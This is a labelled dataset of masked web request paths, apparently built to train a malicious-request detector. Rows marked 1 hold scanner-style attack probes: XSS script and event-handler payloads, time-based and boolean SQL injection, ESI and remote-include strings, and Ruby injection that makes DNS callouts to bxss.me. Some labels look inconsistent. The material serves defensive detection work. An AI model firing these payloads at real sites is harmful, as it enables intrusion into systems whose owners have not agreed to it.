request	label
/******/system/2016/10/28/012172699.shtml	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u91d1\u9f0e\u9aa8\u6c64\u725b\u8089\u9762\u9910\u5385	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5bcc\u6d77\u8fbe\u52b3\u52a1\u6709\u9650\u516c\u53f8	0
/*******/qiye/b-e719925.html	0
/__local/*/79/87/7d23481cd9ff2c70ff904af1607_5a73bbea_5143.png	0
/******/system/2017/10/17/012442664.shtml	0
/****/bmkx/ygjt/202103/w020210311543736872659.jpg	0
/****/xfgj	0
/****/qzfwj/202103/t20210323_2635048.html	0
/*****/imagies/date.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6bdb\u7acb\u8bb8\u5ddd\u83dc\u9986	0
"/************/search.do?begin=20201012&end=20211012&eq=1'""""()&%<acx><script >6qjr(9905)</script>&oq=1&p=1&pg=1&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid="	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u534e\u4f17\u6cf0\u7535\u5668\u7ecf\u9500\u90e8	0
/*******/gjv1nz2b.php	1
/****/system/2020/04/01/javascript:window.print()	1
/****/whhd/201412/t20141218_48033.html	0
/*****/index/lists/cate_id/166.html?page=2	0
"/vc"""" and 2*3*8=6*8 and """"kzdt""""=""""kzdt/**/widgets/scrollup/css/themes/image.css"	1
"/****/scripts/booking/eventlist.php?serviceid=1337"" onmouseover=""alert(777)"	1
/***/blockdata/getsearchinfo.do?&title=\u65e5\u53d1	0
/**********/system/2021/06/17/013403912.shtml	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u8302\u6e90\u8857\u60a6\u76ee\u9006\u9f84\u7f8e\u5bb9\u7f8e\u4f53\u4e2d\u5fc3	0
/****/wdszs/hfsz/202110/t20211028_195951.html	0
/****/if(now()=sysdate(),sleep(12),0)/gcjsbzgl/gcjybz.htm	1
/****/xqdt/byq/201805/t20180531_104006.html	0
"/****/main/messages/outbox.php?f=social"""" onmouseover=""""confirm(777)"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5730\u533a\u4e50\u767e\u7279\u798f\u5229\u51b7\u996e\u52a0\u5de5\u5382	0
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/201808/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/*/191211-8/index/http://bxss.me/t/xss.html?	1
"/images<esi:include src=""""http://*******/rpb.png""""/>/select.css"	1
/**********/system/2020/12/07/013297849.shtml	0
/**********/system/2020/11/27/javascript:void();	1
/*****/gy48/cpgyss.asp?key=\u6df7\u6d41\u98ce\u673a\u535a\u5927\u516c\u53f8\u64cd\u4f5c\u7ef4\u4fee\u57f9\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/*******/0rl.php	1
/*******/qiye/b-e2173748.html	0
/******/usercenter/index?qrcode=44115&code=061bf10w30nrex2ttq3w3op6gv1bf10y	0
/******/public/2019/10/22/93714.images/v93714_b1571730865225_app.jpg	0
/****/system/2015/01/31/011626754.shtml	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5174\u9686\u4e00\u526a\u7f18\u7406\u53d1\u5e97	0
/******/scy_gj_mtll_03.png	0
"/**********/system/2021/09/07'""/><script>alert(775)</script>/013447361.shtml"	1
/*******/qiye/b-e1818350.html	0
/****/whs/yw_1286/202011/t20201127_2384444.html	0
/*****/gjcp/gjjtwzq/xwzx/ztbd/xxgk/nbfw/gygj/ddjs/ghgz/xwzx/ywly/jrytz/kjcx/xyfw/bzhwyh/	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u83dc\u7740\u6025\u852c\u83dc\u914d\u9001\u670d\u52a1\u4e2d\u5fc3	0
"/****/zdlygk/czzjzdjc/\""javascript:void(0)\"""	1
/****/bmkx/jtysj/202001/t20200126_146875.html	0
/****/tzgg/2015/201506/t20150618_60861.html	0
"/***/?cmd=new_section°Ïion=""%3<script>alert(777);</script>"	1
/******/wangjing.jpg	0
/****/web/search?searchword=1&channelid=287219%' or 3851=3851 and '%%'='%&perpage=24&templet=1&token=1	1
/**********/system/2021/12/21/013497475.shtml	0
/**********/system/2021/12/20/013497240.shtml	0
/**********/system/2021/04/19/013370633.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u6708\u7434\u8c46\u8150\u52a0\u5de5\u5e97	0
/****/system/2021/11/24/javascript:window.close();	1
/*************/pm_gatt_inc.aspx?project_id=sys.fn_varbintohexstr(hashbytes('md5','kc1qu'))	1
/******/glddh/1.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5eb7\u8d1d\u6d17\u5316\u5e97	0
/******/download/downfile.jsp?classid=0' and 9723=8406 and 'nkgr'='nkgr&filename=5e843683d0fe4948a646311bf154afc6.doc	1
/****/xqdt/jtx/201610/t20161025_43740.html	0
/****/ccp_48498/zwhd/202112/t20211208_3208914.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u4e1d\u4e1d\u7f8e\u53d1\u5e97	0
/*******/qiye/home-e51870.html	0
/*******/e5rom.php	1
/*******/qiye/b-e1313595.html	0
"/****/byysqgk/xxgkzn/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(98).concat(84).concat(109).concat(85) (require""""socket""""
socket.gethostbyname(""""hittg"""" """"ekkqddfnc97a2.bxss.me."""")[3].to_s) """""	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""1124480""}"	0
/**/ui/widgets/cookie'||'/jquery.cookie.js	1
/****/2020wzqh/wzqh_gzbs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5929\u5929\u4e00\u54c1\u70e7\u70e4\u5e97	0
/****/zsrc/goods.list.html?key=hi' or 'a'='a	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6b23\u7f18\u5e8a\u4e0a\u7528\u54c1\u5e97	0
/****/clhlbj/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/**********/system/2020/05/30/013174058.shtml	0
/******/resource/interview/room.jsp?wbinterviewid=1033') or 3391=5655	1
/****/businesses-e40011_42.html?category_id	0
/***/login/tohome.z?editionmodelval=0'||(pg_sleep(8.0))||'	1
/****/xxgkml/qtfdxx/zcjd/qwjd/201903/w020190315559969649027.png	0
/**********/system/2020/08/20/013230744.shtml	0
/****/qzfwj/5620/5640/index_1.html	0
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/plq/xmb_gzdxb.htm	1
/****/system/2021/10/15/javascript:window.close();	1
/************/http://bxss.me/t/fit.txt?.jpg/jcse/110105008056111/16/images/hanweb.css	1
"/****/¬Â—Ù?page='""""()&%<acx><script >cqqv(9567)</script>"	1
/***/003/004/501/00300450129_cc64fc46.jpg	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u9686\u6e56\u534e\u8bda\u77f3\u6cb9\u5316\u5de5\u6709\u9650\u516c\u53f8	0
/*****/003/003/746/00300374614_vw00000000000001_6ba19a12.mp4	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/t20211206_197314.html	0
/****/\ufffd\ufffd\ufffd\ufffd?page=28	0
/*****/system/2012/04/26/010753524_01.shtml	1
/******/home/css/goods.css	0
/***/index.php?do=post&id=428&c=dt&a=goods&	1
"/****/""><script>alert(75)</script>"	1
/***********/zaojianpinglun/?_=1640025834368	0
/****/1013/1205.htm	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/ajax.js	1
/***/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645	1
"/**/ui"""" and 2*3*8=6*8 and """"7rea""""=""""7rea/lib/easyui/plugins/jquery.parser.js"	1
/***/interface/url_total_pv.json.jsp?callback=jquery19105577699238850891_1640016749313	0
/*******/gqp40w.php	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u535a\u7f8e\u8431\u5316\u5986\u54c1\u7ecf\u9500\u4e2d\u5fc3	0
"/***/col195/'""""()&%<acx><script >jjtk(9014)</script>.html"	1
/**/mediacenter/news/' and 'x'='y	1
/***/0/00/29/06/290694_758473.jpg	0
/****/201909/w020190926583386289629.jpg	0
"/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=16	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u674e\u5efa\u80dc\u5e9f\u65e7\u6536\u8d2d\u7ad9	0
/****/gfxwj/list_23.html	0
"/****/zfwzjs/201912/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/system/2013/01/15/javascript:dozoom(9)	1
/******/phpunit/phpunit/license	0
/zwxx_11337/****/201801/t20180130_681925.html	0
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5b9a\u533a\u54c1\u724c	0
/**********/index.shtml?t=b9s2w	0
/*******/37oq1bl7.php	1
/art'||'/****/10/12/art_31_242356.html	1
"/****/dqgz/"" and ""x""=""y"	1
/**/system/2020/12/29/012109107.shtml	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=390&h=844&treeid=1001&refer=ahr0cdovl2p6c2mubw9odxjklmdvdi5jbi8=&pagename=l2luzgv4lmpzca==&newsid=-1	0
/****/ycl/tpbd	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/bzxajgc/gys/jyx.htm	1
/****/czgk/bmjs/zzqfyxt/txxrmfy/201908/t20190808_1655008.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u82f3\u831c\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/jsly/gjjclbj/201501/w020150129626882663807.jpg	0
/*******/action.ashx?cmd=contactaddressgetlist	1
"/****/web/search?searchword=1&channelid=287219&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&templet=1&token=1"	1
/**/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/****/mswpmm/common/newaccount.aspx?email=alert(777)	1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=/xfs.bxss.me&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111	1
/*******/qiye/b-e421104.html	0
/**********/system/2015/09/07/011813664.shtml	1
/****/wdsjs/hfswsj/202108/t20210808_185487.html	0
/****/wlzj/201608/t20160817_319473.html	0
/**********/system/2021/10/16/013465191.shtml	0
/****/czgk/bmjs/qtdw/zzqzfgjjglb/201708/t20170818_549674.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6c49\u4e2d\u5c0f\u5f6d\u917f\u76ae\u5e97	0
/***/blockdata/getsearchinfo.do?&title=\u5317\u4eac\u8bc1\u76d1\u5c40	0
/***/layui/lay/modules/layer.js?v=1639972890830	0
/******/_content/download.jsp?owner=746124344&urltype=0'xor(if(now()=sysdate(),sleep(12),0))xor'z&wbfileid=23735	1
"/****/system/""'><img src=""/wf_xsrf1590.html"">/013446963.shtml"	1
/****/web/search?channelid=254846&searchword=?????? and 1>1	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\u04bb\ufffd\u0435&showpage=1&l=\ufffd\u0ea3	0
/**********/system/2021/10/16/013465203.shtml	0
/*/161208-1/index/http://bxss.me/t/xss.html?	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\u0270\ufffd\u05f0\ufffd\ufffd&order=1	0
/zwxx_11337/****/201706/t20170619_309433.html	0
/***/003/004/056/00300405679_i1001920000600be_bb461b45.jpg	0
/******/resource/interview/room.jsp?wbinterviewid=1033%' and 1091=7963 and '%'='&owner=1707212448	1
/**********/system/2021/11/23/javascript:window.close();	1
/****/zzxxgk/zrzyj/zfxxgkml_2139/zrzyxx/tdgl/202105/t20210510_182321_wap.html	0
/****/web/search?&channelid=234439&searchword=\u8be5\u9879&keyword=\u8be5\u9879	0
/****/system/2021/12/19/012231876.shtml	0
/*******/sanwen.html	0
/***/index.php?m=member&c=index&a=register&siteid=1	1
/****/xqldly/hfbyqz/202107/t20210721_184801.html	0
/**/system/2021/11/25/012225347.shtml	0
/****/30nxb6-syxw-e107460263.html	0
/****/202103/t20210316_2628204.html	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(122).concat(71).concat(121).concat(81) (require""""socket""""
socket.gethostbyname(""""hitla"""" """"rrwjekob50e43.bxss.me."""")[3].to_s) """"/**/widgets/scrollup/css/themes/image.css"	1
/****/jtdt/2013jtdt/201412/t20141218_37540.html	0
/****/zt/jczwgk/qtxs/index_1.html	0
/****/czgk/bmyjs/zzqjcyxt/ltqrmjcy/	0
/***/0/02/10/17/2101740_368673.jpg	0
"/art"""" and 2*3*8=6*8 and """"idak""""=""""idak/****/10/11/art_34_242318.html"	1
/****/20211018/javascript:void(0);	1
/**********/tsqh/javascript:window.close();	1
"/****/rsgzxx/rsrm/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/****/bysw/202110/w020211020370991304790.jpg	0
/****/plus/moon.php	1
/****/jxjcj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***********/shangpinqihuo/heisebankuai/2021-01-29/1720.html	0
/******/usercenter/index?qrcode=quicklyrq,3,15028,20210	0
/**********/system/2021/09/26/013457106.shtml	0
/******/system/2014/06/12/011423543.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery111108028341362949298_1639990859237	0
/****/web/search?page=2&channelid=222832&searchword=\u8463\u73b2&keyword=\u8463\u73b2&perpage=20&outlinepage=10	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/jst/201903/t20190305_1298597.html	0
/**/http://bxss.me/t/fit.txt?.jpg.do	1
"/******/resource/js/jquery/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.js"	1
"/****/czgk/bmyjs/zzqfyxt/pyxrmfy/202103/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/qzfwj/201901/t20190102_1240029.html	0
/****/xxgkml/zfczyjs/bmyjs/list_2.html	0
/*****/system/2021/11/16/javascript:window.print()	1
"/****/web/search?channelid=234439&orderby=relevance&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&searchword=1"	1
/****/zfgb/2021/202103/p020210316567985640442.pdf	0
/******/dsjy/jd/	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5609\u951c\u852c\u83dc\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/*****/system/2021/11/22/javascript:window.close();	1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777)	1
/********/news/	0
/**********/system/2013/08/28/011173524_04.shtml	1
"/**/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/***/viewspace-311.html	0
/****/czgk/bmjs/zzqgyqy/hhcbjt/201701/t20170113_317975.html	0
/****/bysw//xfs.bxss.me/t20200119_146666.html	1
/****/b-e706170.html	0
/**********/system/2020/04/05/013132282.shtml	0
/****/czgk/bmjs/sydw1/zzqbjj/201609/t20160930_318464.html	0
"/*********/index/login/index.html?fromurl=st4r7s<d3v	onmouseover	=	confirm()//qqqxss3nd&username=8"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u817e\u6cf0\u79be\u6c7d\u4fee\u90e8	0
/***/0/02/10/75/2107516_847527.jpg	0
/****/system/2021/10/22/javascript:dozoom(9)	1
/*******/842726.html	0
/****/mtgz/mt16/	1
"/************/search.do?begin=1&end=1&eq=1&oq=1&p=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&pg=1&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111"	1
/**********/system/2021/08/31/013442380.shtml	0
/************/action/contract/sign/1473117203472601088?signer_code=42212419670303421x&biz_id=1640053487309&redirect_url=https:/www.zsebank.com/bank/bank-recordedvideobackupfivereconfirm.jsp	0
/******/ddh/qhgj/	0
/*****/gy48/cpgyss.asp?key=\u6df7\u51dd\u571f\u6405\u62cc\u673a\ufffd?&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/zwxx_11337/****/201809/t20180919_1067136.html	0
/**********/system/2020/01/14/013055770.shtml	0
/****/zzxxgk/wsjkwyh/ddjs/202005/t20200529_167126.html	0
/****/whs/yw_1286/201511/t20151104_314462.html	0
/****/shzr/cxgj/css/style_20141111.css	0
"/****/qzfwj/202110/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
"/*****/gywm/js/data.js/""""><script>alert(337)</script>"	1
/****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.aspx	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u90b5\u521a\u9547\u4e8c\u65d7\u6751\u5229\u946b\u5546\u5e97	0
/**********/system/2020/12/23/013307965.shtml	0
/****/gjzqq/index.html?continent=%' or 9906=8813	1
/******/system/2019/06/22/012910283.shtml	0
/****/2021_mtgz/202107/t20210712_310551.html	0
/******/pcqwsj	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u58f0\u6d6a\u7535\u8baf\u5546\u884c	0
/********/	0
/***/003/003/109/	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u897f\u6d77\u5cb8	0
/**********/system/more/217000000000000/0046/217000000000000_00004682.shtml	0
/********/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)>	1
/**********/system/2021/11/17/javascript:window.close();	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(559)"">?_=1630311512775"	1
/******/public/2021/12/16/112018.images/v112018_b1639616260745_app.jpg	0
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/******/rlzy/rcln/xxgk/qyzdsx/qtyz/ddjs/qtgz/ywly/gccb/wlgc/	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5609\u534e\u8f66\u8f86\u7ef4\u4fee\u670d\u52a1\u4e2d\u5fc3	0
/****/bmkx/snmj/202112/t20211208_197551_wap.html	0
"/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status="" onmouseover=""alert(777)"""	1
/***/cgi-bin/ipinfo.cgi?alert(777)	1
/****/tips/tipsloginsubmit.action	1
/zwxx_11337/****/202003/t20200319_1995407.html	0
/****/clhlbj/201411/w020141126311517378449.jpg	0
/****/bmkx/styj/201805/w020180529603606358135.jpg	0
/****/web/search/search?page=3';select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/******/tcommon.js	0
/*******/qiye/b-e1602521.html	0
/***/interface/comul_total.json.jsp?callback=jquery1111000915458402572078_1640052979192	0
/****/system/2021/08/04/javascript:window.print()	1
/****/0328/824168.shtml	0
/***/?//bxss.me	1
/******/system/2020/08/04/javascript:window.print()	1
/****/zt/2016nb/xjzf/201801/p020180112421158482194.pdf	0
/**********/system/2021/01/10/013317279.shtml	0
/zwxx_11337/****/201905/t20190527_1522793.html	0
/*****/20210616/10004.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsjt/	0
/**********/system/2020/12/01/javascript:window.close();	1
/*****/system/2021/01/07/javascript:void();	1
"/******/system/2021/06/09/013399706'""""/><img src=javascript:alert(2309) .shtml"	1
/**********/system/2020/06/21/013189780.shtml	0
/***/mobile_h5/waparticledetail.do?article_id=202112201359281062&contenttype=article	0
/0'xor(if(now()=sysdate(),sleep(0),0))xor'z/****/bmleft.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u767d\u9a6c\u6e56\u660c\u6e90\u996d\u5e84	0
"/*/action/showinfo/?classid=11&id=10317'""""()&%<acx><script >9wtx(9749)</script>"	1
/***/0/00/96/94/969404_926154.jpg	0
/***/003/004/452/00300445272_75657413.jpg	0
/****/system/more/13711050000000000/0000/13711050000000000_00000004.shtml	0
/****/web/search?page=260&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/zwxx_11337/****/202001/t20200122_1930829.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrthdvvazc7toxdxahrnawk78=&openid=ovl7jjvjv-xqygl08gkele1aftpy&outer_str=4882&activate_ticket=fdzv9emqaffrnr3xboqhbzuf/a4tk0e/hxltd8y4lhloo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5hkiebfyxo3ds1b4guvnj68=	0
/**********/system/2021/10/18/013465569.shtml	0
/*****/hfswsj/202112/t20211206_197406.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u674e\u798f\u517b\u6b96\u573a	0
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111	1
/****/20201129/e111297130.html	0
/*******/41n6xny2.php	1
/******/index/xwzx/index.shtml	0
/******/appweb.do?method=appdatadetail&groupid=770&appid=2100&dataid=66590	0
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/****/zt/2020wznb/gznbxjzf/202101/p020210128377946352424.pdf	0
/****/	0
/****/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php	1
/******/system/2019/07/02/012918414.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5e1d\u561f\u97f3\u4e50\u9910\u5427	0
/**/system/2007/11/12/002251370.shtml	0
/****/zxta/202112/t20211208_3210265.html	0
/************/bxss.me/jcse/110105008056111/16/images/hanweb.css	1
/***/images/lrbbb.gif	0
/******/ly_gj_yewulingyu_12.jpg	0
/****/ccp_48498/zwhd/	0
/********/xwzx/szyw/rlzy/rcln/rlzy/rcgk/ddjs/gjcp/jcgj/xwzx/gjmt/zgsmt/xwzx/jtdt/2021_jtyw/202107/ywly/gccb/wlgc/	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8d35\u59ff\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7530\u5bb6\u4fbf\u5229\u70e9\u8089\u9986	0
/******/web/http://bxss.me/t/fit.txt?.jpg/theme/simple/css/jpage.css	1
/***/api/sources?resource=alert(/777/)&format=txt	1
/************/template/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/selectpick/js.js	1
"/********/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
/**/ui/widgets/http://bxss.me/t/fit.txt/jquery.cookie.js	1
/**********/system/2021/10/10/013461934.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 5637=5637 and '1'='1	1
/**********/system/2021/12/05/javascript:void(0);	1
/zwxx_11337/****/mtjd/202003/w020211009655753264779.jpg	0
/**********/system/2021/09/25/013456310.shtml	0
/****/system/2021/06/07/013397797.shtml	0
/**/mediacenter/news/index_5.html	0
/****/gccb/hjgc/images/p020141121378302827853.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u526a\u7231\u7f8e\u53d1\u5e97	0
/**********/system/2021/12/12/013493281.shtml	0
/***/0/11/18/48/11184805_999789.jpg	0
/******/system/2019/06/23/012910777.shtml	0
"/****/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u76db\u65fa\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/tzgg/2019_tzgg/201903/t20190314_205261.html	0
"/****/qyjbxx/"" and ""x""=""y"	1
/******/1/language.js	0
/**********/system/2021/05/28/013392891.shtml	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/********/js/dynclicks.js"	1
/****/20170428/3025.html	0
/**********/system/2020/07/28/013214989.shtml	0
/****/czgk/czyjs/201902/t20190219_1283700.html	0
"/****/games.php?des='"">><script>alert(' 777')</script>"	1
/****/ztzk	0
/**/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/****/bmkx/styj/201907/w020190729381362305896.jpg	0
/**/mediacenter/news/202101/t20210106_269049.html	0
"/****/byszf/201610/t20161016_542.html?leader=' 'a'.concat(70-3).concat(22*4).concat(98).concat(88).concat(105).concat(65) (require'socket'
socket.gethostbyname('hitbx' 'czefpizyc93e6.bxss.me.')[3].to_s) '"	1
/*******/202006/202006281909111191.html	0
"/******/visitcount/visit.jsp/<img src=""javascript:alert(5765)"">?type=2&i_webid=1&i_columnid=11"	1
/************/template/jcse/110105008056111/16/images//xfs.bxss.me/hotnews/js.js	1
/**********/system/2020/04/05/javascript:window.close();	1
/*******/qiye/b-e2024192.html	0
/***/interface/daily_clickcount.json.jsp?callback=jquery17105965142347849905_1640025043925	0
/**********/system/2021/11/04/013475508.shtml	0
/****/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66	1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/***/0/01/85/25/1852525_997633.jpg	0
/zwgk'||'/******/bzxajgc.htm	1
"/*/201020-1/'""""()&%<acx><script >vbbu(9574)</script>/d7c921b2c59d284228d4f6d2d18d0cae.css"	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/gys/bsj/zcwj.htm	1
"/****/html'""""()&%<acx><script >kwa1(9035)</script>/demo11.html"	1
/****/0319/822608.shtml	0
/****/system/2021/12/08/javascript:dozoom(14)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5f02\u57df\u98ce\u60c5\u6309\u6469\u517b\u751f\u9986	0
/*******/568osv.php	1
/***/mobile_h5/wapshouye.do?channelid=xianfeng	0
/**********/system/2021/07/01/013411320.shtml	0
/**********/system/2020/05/22/013168028.shtml	0
